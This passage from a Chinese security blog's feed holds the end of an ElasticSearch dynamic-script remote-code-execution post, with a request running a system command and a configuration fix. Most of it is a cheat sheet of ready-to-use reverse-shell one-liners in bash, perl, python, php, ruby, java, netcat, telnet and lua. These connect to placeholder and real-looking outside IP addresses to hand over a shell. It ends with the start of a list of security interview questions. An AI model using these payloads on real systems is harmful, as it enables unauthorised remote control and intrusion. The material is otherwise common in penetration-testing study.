class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;hihihi&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/p/2d0c/1.png" alt><br>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /_search?pretty HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 343</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;: 1,</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">      &quot;filtered&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &#123;</span><br><span class="line">          &quot;match_all&quot;: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;script_fields&quot;: &#123;</span><br><span class="line">        &quot;command&quot;: &#123;</span><br><span class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/p/2d0c/2.png" alt></p><h2 id="修复方案">修复方案</h2><ul><li>升级到最新版本</li><li>在elasticsearch.yml中将script.disable_dynamic参数改为true</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">script.disable_dynamic:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      ElasticSearch1.2之前有动态脚本执行的功能，这个功能其实可以让我们很方便的查询出数据进行加工处理，但ElasticSearch用的脚本引擎是MVEL，这个引擎是没有任何安全机制的，通过_search方法的参数传入恶意代码，远程执行任意MVEL表达式和Java代码。
    
    </summary>
    
    
      <category term="exploit" scheme="https://hexchristmas.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>各种花式弹shell，不怕姿势多，就怕记不住</title>
    <link href="https://hexchristmas.github.io/p/24f9.html"/>
    <id>https://hexchristmas.github.io/p/24f9.html</id>
    <published>2020-06-05T23:52:12.000Z</published>
    <updated>2020-06-05T15:54:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1>各种花式弹shell，不怕姿势多，就怕记不住</h1><h2 id="bash">bash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done /*这样写可以*/</span><br><span class="line">cat &lt;&amp;5 | while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done /*这样写也可以*/</span><br></pre></td></tr></table></figure><h2 id="perl">perl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos; /*linux可以这样写*/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos; /*linux可以这样写*/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos; /*windows可以这样写*/</span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#又或者直接写个pl文件也可以</span></span><br><span class="line"><span class="comment">#1.pl</span></span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">"x.x.x.x"</span>;</span><br><span class="line">$p=<span class="number">8080</span>;</span><br><span class="line"><span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">            &#125;;</span><br></pre></td></tr></table></figure><h2 id="python">python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure><h2 id="php">php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure><h2 id="ruby">ruby</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure><h2 id="java">java</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="nc">nc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 223.8.200.234 1234 /*有的发行版linux没有-e的参数*/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p </span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure><h2 id="telnet">telnet</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp;&amp;&amp; telnet attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet attackerip 4444 | /bin/bash | telnet attackerip 4445</span><br></pre></td></tr></table></figure><h2 id="lua">lua</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;202.103.243.122&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      最近看到什么搞什么，学什么
    
    </summary>
    
    
      <category term="reverse_shell" scheme="https://hexchristmas.github.io/tags/reverse-shell/"/>
    
  </entry>
  
  <entry>
    <title>SecurityInterview</title>
    <link href="https://hexchristmas.github.io/p/f141.html"/>
    <id>https://hexchristmas.github.io/p/f141.html</id>
    <published>2020-06-03T00:26:58.000Z</published>
    <updated>2020-06-02T16:31:43.000Z</updated>
    
    <content type="html"><![CDATA[<h1>安全面试题</h1><ul><li><a href="#%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95">面试问题记录</a><ul><li><a href="#360">360</a><ul><li><a href="#sql%E7%9A%84%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E">SQL的存储引擎</a></li><li><a href="#sql%E6%B3%A8%E5%85%A5%E5%86%99shell%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%94%A8%E6%B3%95">SQL注入写shell的条件，用法</a></li><li><a href="#gpc%E6%98%AF%E4%BB%80%E4%B9%88%E5%BC%80%E5%90%AF%E4%BA%86%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87">GPC是什么？开启了怎么绕过</a></li><li><a href="#mysql%E4%B8%80%E4%B8%AA%E5%92%8C%E4%B8%A4%E4%B8%AA%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">Mysql一个@和两个@什么区别</a></li><li><a href="#iis%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E6%9C%89%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E5%AE%B9%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</a></li><li><a href="#wireshark%E6%8A%93%E5%8C%85%E6%95%B0%E6%8D%AE%E6%8A%A5%E7%BB%8F%E8%BF%87%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%B7%AF%E7%94%B1%E7%9A%84%E5%8F%98%E5%8C%96nat%E5%8D%8F%E8%AE%AE%E6%8F%8F%E8%BF%B0%E5%9C%B0%E5%9D%80%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91%E6%80%8E%E4%B9%88%E5%8F%98%E5%8C%96">wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</a></li><li><a href="#linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%BC%9A%E6%80%8E%E4%B9%88%E5%81%9Awindows%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%80%8E%E4%B9%88%E8%AE%BE%E5%AE%9A">linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</a></li><li><a href="#%E6%8C%96%E8%BF%87%E6%9C%80%E9%9A%BE%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88">挖过最难的漏洞是什么</a></li></ul></li><li><a href="#ukelink">ukelink</a><ul><li><a href="#%E7%97%85%E6%AF%92%E5%92%8C%E8%A0%95%E8%99%AB%E7%9A%84%E5%8C%BA%E5%88%AB">病毒和蠕虫的区别</a></li><li><a href="#dns%E6%AC%BA%E9%AA%97%E6%98%AF%E4%BB%80%E4%B9%88">DNS欺骗是什么</a></li><li><a href="#DDOS%E6%9C%89%E5%93%AA%E4%BA%9B,CC%E6%94%BB%E5%87%BB%E6%98%AF%E4%BB%80%E4%B9%88,%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88,%E5%9C%A8%E5%93%AA%E4%B8%80%E4%B8%AA%E5%B1%82%E9%9D%A2,%E4%BB%80%E4%B9%88%E5%8D%8F%E8%AE%AE">DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</a></li><li><a href="#%E9%99%86%E5%9C%B0land%E6%94%BB%E5%87%BB%E6%98%AF%E4%BB%80%E4%B9%88">陆地land攻击是什么</a></li><li><a href="#xss%E6%9C%89%E4%BB%80%E4%B9%88%E6%89%A7%E8%A1%8C%E5%AD%98%E5%82%A8%E5%9E%8B%E7%9A%84xss%E7%9A%84%E5%8D%B1%E5%AE%B3%E5%92%8C%E5%8E%9F%E7%90%86">xss有什么？执行存储型的xss的危害和原理</a></li><li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E4%B8%8D%E5%A4%9F%E6%B8%85%E6%99%B0%E5%A4%AA%E6%B5%85%E6%98%BE">渗透测试流程？（不够清晰，太浅显</a></li><li><a href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%9A%84%E8%B0%83%E8%AF%95%E7%BB%8F%E9%AA%8C-apkipa%E5%8C%85%E5%88%86%E6%9E%90">有没有移动端的调试经验 apk,ipa包分析</a></li><li><a href="#%E5%AF%B9%E4%BA%8E%E4%BA%91%E5%AE%89%E5%85%A8%E7%9A%84%E7%90%86%E8%A7%A3">对于云安全的理解</a></li><li><a href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E7%9A%84%E7%90%86%E8%A7%A3">虚拟机逃逸的理解</a></li><li><a href="#%E8%8B%B1%E8%AF%AD%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E8%87%AA%E5%B7%B1">英语介绍一下自己</a></li><li><a href="#%E8%81%8C%E4%B8%9A%E8%B7%AF%E5%BE%84">职业路径</a></li><li><a href="#%E5%A4%A7%E5%AD%A6%E5%81%9A%E8%BF%87%E4%BB%80%E4%B9%88%E7%9B%B8%E5%85%B3%E7%9A%84%E4%BA%8B%E6%83%85">大学做过什么相关的事情</a></li><li><a href="#%E5%9C%A8%E5%B7%A5%E4%BD%9C%E4%BC%9A%E5%81%9A%E4%BB%80%E4%B9%88%E6%9D%A5%E4%B8%8D%E6%96%AD%E6%8F%90%E9%AB%98%E8%87%AA%E5%B7%B1%E7%9A%84%E8%83%BD%E5%8A%9B">在工作会做什么来不断提高自己的能力</a></li></ul></li><li><a href="#%E5%8D%93%E6%9C%9B">卓望</a><ul><li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B">渗透测试流程</a></li><li><a href="#%E6%8F%8F%E8%BF%B0%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88">描述渗透项目，做了什么</a></li><li><a href="#xss%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E8%AF%A6%E6%83%85%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">xss漏洞类型、详情、修复方案</a></li><li><a href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E7%B1%BB%E5%9E%8Bwaf%E7%BB%95%E8%BF%87%E5%86%99shell%E6%8F%90%E6%9D%83%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">SQL注入原理、类型，waf绕过，写shell，提权，修复方案</a></li><li><a href="#%E7%BB%88%E7%AB%AF%E7%9A%84%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C">终端的渗透经验</a></li><li><a href="#%E4%BA%86%E8%A7%A3%E4%BB%80%E4%B9%88%E6%AF%94%E8%BE%83%E6%96%B0%E7%9A%84%E6%BC%8F%E6%B4%9E">了解什么比较新的漏洞</a></li><li><a href="#%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E5%AE%89%E5%85%A8">企业内部安全</a></li></ul></li><li><a href="#%E5%AE%89%E5%B7%BD">安巽</a><ul><li><a href="#%E7%AE%97%E6%B3%95%E4%BA%86%E8%A7%A3%E8%BF%87%E4%BB%80%E4%B9%88%E6%8E%92%E5%BA%8F">算法？了解过什么排序？</a></li><li><a href="#%E7%88%AC%E8%99%AB">爬虫</a><ul><li><a href="#%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8%E5%BE%88%E5%A4%9Ajs%E7%9A%84%E6%97%B6%E5%80%99%E7%94%A8%E4%BB%80%E4%B9%88">页面存在很多js的时候，用什么</a></li><li><a href="#%E7%88%AC%E8%99%AB%E7%9A%84%E5%BE%85%E7%88%AC%E5%8F%96url%E9%87%8F%E7%BA%A7%E6%AF%94%E8%BE%83%E5%A4%A7%E7%9A%84%E6%97%B6%E5%80%99%E5%A6%82%E4%BD%95%E5%AF%B9%E5%85%B6%E5%8E%BB%E9%87%8D">爬虫的待爬取URL量级比较大的时候，如何对其去重</a></li><li><a href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E5%BC%82%E6%AD%A5-%E5%8D%8F%E7%A8%8B-%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-%E7%94%A8%E5%93%AA%E4%B8%80%E4%B8%AA%E6%9C%80%E5%BF%AB-%E4%B8%BA%E4%BB%80%E4%B9%88">多线程 异步 协程 多路复用 用哪一个最快 为什么</a></li></ul></li><li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81">浏览器的常用编码</a></li><li><a href="#web%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%9C%89%E4%BB%80%E4%B9%88">web常用的加密算法有什么</a></li><li><a href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E7%BB%8F%E9%AA%8C%EF%BC%9F%E6%80%8E%E4%B9%88%E6%B8%97%E9%80%8F%EF%BC%9F%E5%A6%82%E6%9E%9C%E6%8B%BF%E4%B8%8B%E4%BA%86%E8%BE%B9%E7%95%8C%E5%B1%82%E7%9A%84%E6%9F%90%E4%B8%80%E4%B8%AA%E6%9C%BA%E5%99%A8%EF%BC%8C%E5%A6%82%E4%BD%95%E5%AF%B9%E5%86%85%E7%BD%91%E5%85%B6%E4%BB%96%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B%EF%BC%9F">有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</a></li><li><a href="#mysql%E4%B8%ADlike%E6%9F%A5%E8%AF%A2%E4%BC%9A%E4%BC%9A%E9%9D%9E%E5%B8%B8%E7%BC%93%E6%85%A2%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%BC%98%E5%8C%96">mysql中like查询会会非常缓慢，如何进行优化</a></li><li><a href="#%E5%81%9A%E4%BA%86cdn%E7%9A%84%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9Eip">做了cdn的网站如何获取真实IP</a></li><li><a href="#%E6%B8%97%E9%80%8F%E7%9A%84%E6%97%B6%E5%80%99%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E8%BA%AB%E4%BB%BD">渗透的时候如何隐藏自己的身份</a></li><li><a href="#%E4%B8%BB%E6%9C%BA%E7%96%91%E4%BC%BC%E9%81%AD%E5%88%B0%E5%85%A5%E4%BE%B5%E8%A6%81%E7%9C%8B%E5%93%AA%E9%87%8C%E7%9A%84%E6%97%A5%E5%BF%97">主机疑似遭到入侵，要看哪里的日志</a></li><li><a href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%8E%E4%B9%88%E4%BF%AE%E5%A4%8D">SQL注入漏洞怎么修复</a></li></ul></li><li><a href="#%E9%95%BF%E4%BA%AD">长亭</a><ul><li><a href="#%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%9A%84%E6%96%B9%E9%9D%A2%E5%81%9A%E8%BF%87%E5%93%AA%E4%BA%9B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%B7%A5%E4%BD%9C">安全研究的方面？做过哪些渗透测试的工作？</a></li><li><a href="#%E5%8F%AA%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">只给你一个网址，如何进行渗透测试</a></li><li><a href="#SQL%E6%B3%A8%E5%85%A5%EF%BC%8Cid=1%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%EF%BC%9Forderby%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8%EF%BC%9Flimit%E8%AF%AD%E5%8F%A5%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8%EF%BC%9F%E7%9B%B2%E6%B3%A8%E6%9C%89%E4%BB%80%E4%B9%88%EF%BC%9F">SQL注入，id=1如何检测？order by怎么利用？limit语句怎么利用？盲注有什么？</a></li><li><a href="#sleep%E8%A2%AB%E7%A6%81%E7%94%A8%E5%90%8E%E8%BF%98%E8%83%BD%E6%80%8E%E4%B9%88%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5">sleep被禁用后还能怎么进行sql注入</a></li><li><a href="#xss%E5%8F%AF%E4%BB%A5%E6%8E%A7%E5%88%B6%E5%B1%9E%E6%80%A7%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8">XSS可以控制属性怎么利用</a></li><li><a href="#csrf%E6%80%8E%E4%B9%88%E9%98%B2%E6%8A%A4">CSRF怎么防护？</a></li><li><a href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%B8%AD%E5%93%AA%E4%BA%9B%E6%98%AF%E6%9C%89%E5%8D%B1%E5%AE%B3%E7%9A%84">请求头中哪些是有危害的？</a></li><li><a href="#XXE%E7%9A%84%E5%8D%B1%E5%AE%B3%EF%BC%9F%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E5%AE%B9%E6%98%93%E5%AD%98%E5%9C%A8xxe%EF%BC%9Fxxe%E6%9E%B6%E6%9E%84%E6%96%B9%E9%9D%A2%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BA%86%E8%A7%A3%E8%BF%87">XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</a></li><li><a href="#java%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%BE%E5%87%A0%E4%B8%AA%E4%BE%8B%E5%AD%90">JAVA中间件的漏洞，举几个例子？</a></li><li><a href="#iis%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E">IIS常见的漏洞</a></li><li><a href="#python%E6%9C%89%E5%93%AA%E4%BA%9B%E6%A1%86%E6%9E%B6%E5%85%B6%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E">python有哪些框架，其中出现过哪些漏洞</a></li><li><a href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%94%A8%E6%88%B7%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E4%B8%BE%E5%87%BA%E6%9C%89%E4%BB%80%E4%B9%88%E4%BE%8B%E5%AD%90%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9B%A0%E7%B4%A0%E5%AF%BC%E8%87%B4%E7%9A%84%EF%BC%9F">业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</a></li><li><a href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9F%E5%BC%80%E6%BA%90%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%9C%89%E6%B2%A1%E6%9C%89%E5%81%9A%E8%BF%87%EF%BC%9F%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%BF%99%E7%A7%8D%E8%80%83%E7%82%B9%E5%9C%A8%E5%93%AA%EF%BC%9F">PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</a></li><li><a href="#HTTP-Only%E7%A6%81%E6%AD%A2%E7%9A%84%E6%98%AFJS%E8%AF%BB%E5%8F%96cookie%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E8%BF%99%E4%B8%AA%E8%8E%B7%E5%8F%96cookie">HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</a></li></ul></li><li><a href="#%E7%9B%9B%E9%82%A6">盛邦</a><ul><li><a href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E5%81%9A%E8%BF%87%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%92%8C%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90">有没有做过协议分析和抓包分析</a></li></ul></li><li><a href="#%E7%BF%BC%E6%9E%9C">翼果</a><ul><li><a href="#mysql%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC">mysql查看版本？</a></li><li><a href="#%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97">过安全狗</a></li><li><a href="#%E7%BC%96%E7%A8%8B%E8%83%BD%E5%8A%9B%E5%B9%B3%E5%8F%B0%E9%80%86%E5%90%91%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3rootkit%E6%9C%89%E6%B2%A1%E6%9C%89%E7%A0%94%E7%A9%B6%E8%BF%87">编程能力/平台逆向/修改程序入口/rootkit有没有研究过</a></li></ul></li></ul></li></ul><h1>面试问题记录</h1><blockquote><p>CONTACT ME: <a href="http://github.com/leezj9671" target="_blank" rel="noopener">github.com/leezj9671</a></p></blockquote><h2 id="360">360</h2><h3 id="SQL的存储引擎">SQL的存储引擎</h3><h3 